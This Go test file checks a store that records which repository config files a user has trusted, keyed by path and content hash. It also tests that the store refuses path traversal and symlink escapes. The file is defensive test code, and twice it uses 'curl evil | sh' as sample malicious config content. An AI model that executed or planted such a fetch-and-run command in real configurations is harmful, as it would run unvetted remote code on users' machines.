package repotrust

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
)

func writeFile(t *testing.T, root, rel, body string) {
	t.Helper()
	p := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

// A file is trusted as it reads when trusted, by its repository, its
// path and its content, and no longer once it changes.
func TestTrustIsOfOneFileAsItReads(t *testing.T) {
	s := Open(t.TempDir())
	repo, other := t.TempDir(), t.TempDir()
	const rel = ".mako/worktree.toml"
	writeFile(t, repo, rel, "setup_cmd = \"make\"\n")
	data, err := Read(repo, rel)
	if err != nil {
		t.Fatal(err)
	}
	if s.Trusted(repo, rel, data) {
		t.Fatal("trusted before it was trusted")
	}
	if _, err := s.Trust(repo, rel, Hash(data)); err != nil {
		t.Fatal(err)
	}
	if !s.Trusted(repo, rel, data) {
		t.Fatal("not trusted once trusted")
	}
	if s.Trusted(repo, rel, []byte("setup_cmd = \"curl evil | sh\"\n")) {
		t.Fatal("a changed file is still trusted")
	}
	if s.Trusted(other, rel, data) {
		t.Fatal("the same content of another repository is trusted")
	}
	if s.Trusted(repo, ".mako/hooks.toml", data) {
		t.Fatal("another file of the repository is trusted")
	}
	// Each kind of file is kept apart, without the package knowing it.
	if _, err := s.Trust(repo, ".mako/hooks.toml", Hash([]byte("x"))); err != nil {
		t.Fatal(err)
	}
	if !s.Trusted(repo, rel, data) || !s.Trusted(repo, ".mako/hooks.toml", []byte("x")) {
		t.Fatal("trusting a second file forgot the first")
	}
	// Trusting new content replaces the old.
	if _, err := s.Trust(repo, rel, Hash([]byte("new"))); err != nil {
		t.Fatal(err)
	}
	if s.Trusted(repo, rel, data) || !s.Trusted(repo, rel, []byte("new")) {
		t.Fatal("the old content is still trusted")
	}
	if recs, err := s.List(); err != nil || len(recs) != 2 {
		t.Fatalf("list = %v, %v", recs, err)
	}
}

// The root is kept with its links resolved and the path clean, so the
// same file named two ways is one record.
func TestKeyResolvesLinksAndRefusesWaysOut(t *testing.T) {
	repo := t.TempDir()
	link := filepath.Join(t.TempDir(), "link")
	if err := os.Symlink(repo, link); err != nil {
		t.Skip("no symbolic links:", err)
	}
	s := Open(t.TempDir())
	if _, err := s.Trust(link, "./.mako//worktree.toml", Hash([]byte("a"))); err != nil {
		t.Fatal(err)
	}
	if !s.Trusted(repo, ".mako/worktree.toml", []byte("a")) {
		t.Fatal("the repository through a link is not the same one")
	}
	for _, bad := range []string{"", ".", "..", "../x", "a/../../x", "/etc/passwd"} {
		if _, _, err := Key(repo, bad); err == nil {
			t.Errorf("Key(%q) was taken", bad)
		}
	}
	if _, _, err := Key("relative/root", "x"); err == nil {
		t.Error("a relative root was taken")
	}
	if _, err := s.Trust(repo, "x", "not-a-hash"); err == nil {
		t.Error("a bad hash was taken")
	}
}

// Revoke forgets a file, or a whole repository, by its path as given or
// resolved, even once the repository is gone.
func TestRevokeForgetsAFileOrARepository(t *testing.T) {
	s := Open(t.TempDir())
	repo, other := t.TempDir(), t.TempDir()
	for _, rel := range []string{".mako/worktree.toml", ".mako/hooks.toml"} {
		if _, err := s.Trust(repo, rel, Hash([]byte(rel))); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := s.Trust(other, ".mako/worktree.toml", Hash([]byte("o"))); err != nil {
		t.Fatal(err)
	}
	real, _ := filepath.EvalSymlinks(repo)
	gone, err := s.Revoke(filepath.Join(real, ".mako", "hooks.toml"))
	if err != nil || len(gone) != 1 || gone[0].Path != ".mako/hooks.toml" {
		t.Fatalf("revoke file = %v, %v", gone, err)
	}
	if !s.Trusted(repo, ".mako/worktree.toml", []byte(".mako/worktree.toml")) {
		t.Fatal("revoking one file forgot another")
	}
	if err := os.RemoveAll(repo); err != nil {
		t.Fatal(err)
	}
	gone, err = s.Revoke(real)
	if err != nil || len(gone) != 1 {
		t.Fatalf("revoke repository = %v, %v", gone, err)
	}
	recs, _ := s.List()
	if len(recs) != 1 || !strings.HasSuffix(other, filepath.Base(recs[0].Root)) {
		t.Fatalf("left = %v", recs)
	}
	if gone, err := s.Revoke(real); err != nil || len(gone) != 0 {
		t.Fatalf("revoking nothing = %v, %v", gone, err)
	}
}

// The store survives a new Store on the same directory, is written whole
// with the user's permissions only, and a nil or broken one trusts nothing.
func TestStoreKeepsItsFile(t *testing.T) {
	dir, repo := t.TempDir(), t.TempDir()
	s := Open(dir)
	s.now = func() time.Time { return time.Date(2026, 1, 2, 3, 4, 5, 6, time.UTC) }
	rec, err := s.Trust(repo, "f", Hash([]byte("f")))
	if err != nil {
		t.Fatal(err)
	}
	if !rec.TrustedAt.Equal(time.Date(2026, 1, 2, 3, 4, 5, 0, time.UTC)) {
		t.Fatalf("trusted at %v", rec.TrustedAt)
	}
	if !Open(dir).Trusted(repo, "f", []byte("f")) {
		t.Fatal("a store opened again forgot")
	}
	if runtime.GOOS != "windows" {
		fi, err := os.Stat(filepath.Join(dir, FileName))
		if err != nil || fi.Mode().Perm() != 0o600 {
			t.Fatalf("file mode = %v, %v", fi, err)
		}
	}
	var none *Store
	if none.Trusted(repo, "f", []byte("f")) {
		t.Fatal("a nil store trusts")
	}
	if _, err := none.Trust(repo, "f", Hash(nil)); err == nil {
		t.Fatal("a nil store took a trust")
	}
	if err := os.WriteFile(filepath.Join(dir, FileName), []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	if s.Trusted(repo, "f", []byte("f")) {
		t.Fatal("a broken store trusts")
	}
	if _, err := s.Trust(repo, "f", Hash([]byte("f"))); err == nil {
		t.Fatal("a broken store was written over")
	}
}

// Trusts made at once are all kept.
func TestConcurrentTrustsAreAllKept(t *testing.T) {
	s, repo := Open(t.TempDir()), t.TempDir()
	var wg sync.WaitGroup
	for i := range 16 {
		wg.Go(func() {
			if _, err := s.Trust(repo, filepath.Join("d", string(rune('a'+i))), Hash(nil)); err != nil {
				t.Error(err)
			}
		})
	}
	wg.Wait()
	if recs, err := s.List(); err != nil || len(recs) != 16 {
		t.Fatalf("kept %d, %v", len(recs), err)
	}
}

// Read reads regular files alone, and not too much of one.
func TestReadTakesRegularFilesAlone(t *testing.T) {
	repo := t.TempDir()
	writeFile(t, repo, "ok", "fine")
	if data, err := Read(repo, "ok"); err != nil || string(data) != "fine" {
		t.Fatalf("read = %q, %v", data, err)
	}
	if err := os.Mkdir(filepath.Join(repo, "dir"), 0o700); err != nil {
		t.Fatal(err)
	}
	if _, err := Read(repo, "dir"); err == nil {
		t.Fatal("read a directory")
	}
	writeFile(t, repo, "big", strings.Repeat("x", MaxSize+1))
	if _, err := Read(repo, "big"); err == nil {
		t.Fatal("read a file past MaxSize")
	}
	if _, err := Read(repo, "../ok"); err == nil {
		t.Fatal("read out of the repository")
	}
}

// Read follows a link in the file's path only while it stays inside the
// repository: a file, or a folder, linked from outside it is anyone's,
// and is refused.
func TestReadKeepsInsideTheRepository(t *testing.T) {
	repo, outside := t.TempDir(), t.TempDir()
	writeFile(t, outside, "evil.toml", "cmd = \"curl evil | sh\"\n")
	writeFile(t, repo, "conf/real.toml", "cmd = \"make\"\n")
	if err := os.MkdirAll(filepath.Join(repo, ".mako"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join("..", "conf", "real.toml"), filepath.Join(repo, ".mako", "inside.toml")); err != nil {
		t.Skip("no symbolic links:", err)
	}
	if data, err := Read(repo, ".mako/inside.toml"); err != nil || string(data) != "cmd = \"make\"\n" {
		t.Fatalf("a link inside the repository: %q, %v", data, err)
	}
	if err := os.Symlink(filepath.Join(outside, "evil.toml"), filepath.Join(repo, ".mako", "out.toml")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join("..", "..", filepath.Base(outside), "evil.toml"), filepath.Join(repo, ".mako", "up.toml")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(repo, "linked")); err != nil {
		t.Fatal(err)
	}
	for _, rel := range []string{".mako/out.toml", ".mako/up.toml", "linked/evil.toml"} {
		if data, err := Read(repo, rel); err == nil {
			t.Errorf("Read(%s) left the repository: %q", rel, data)
		}
	}
}

// Where the file system ignores case, as macOS's and Windows's do, a
// repository or a file named in another case is the same one: revoking it
// so forgets it, and it is trusted so. Elsewhere it is another.
func TestPathsMatchInCaseAsTheFileSystemDoes(t *testing.T) {
	s := Open(t.TempDir())
	base, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	repo := filepath.Join(base, "Repo")
	writeFile(t, repo, ".mako/Commands.toml", "x")
	if _, err := s.Trust(repo, ".mako/Commands.toml", Hash([]byte("x"))); err != nil {
		t.Fatal(err)
	}
	upper := filepath.Join(base, "REPO")
	_, err = os.Stat(upper)
	insensitive := err == nil // this file system's, which foldCase stands for
	if got := s.Trusted(upper, ".mako/commands.toml", []byte("x")); got != (foldCase && insensitive) {
		t.Errorf("trusted in another case: %v", got)
	}
	gone, err := s.Revoke(filepath.Join(upper, ".MAKO", "commands.toml"))
	if err != nil {
		t.Fatal(err)
	}
	if foldCase != (len(gone) == 1) {
		t.Fatalf("revoking the file in another case forgot %v", gone)
	}
	if _, err := s.Trust(repo, ".mako/Commands.toml", Hash([]byte("x"))); err != nil {
		t.Fatal(err)
	}
	gone, err = s.Revoke(upper)
	if err != nil {
		t.Fatal(err)
	}
	if foldCase != (len(gone) == 1) {
		t.Fatalf("revoking the repository in another case forgot %v", gone)
	}
	if runtime.GOOS == "darwin" || runtime.GOOS == "windows" {
		if !foldCase {
			t.Fatal("paths are matched in case on", runtime.GOOS)
		}
	}
}
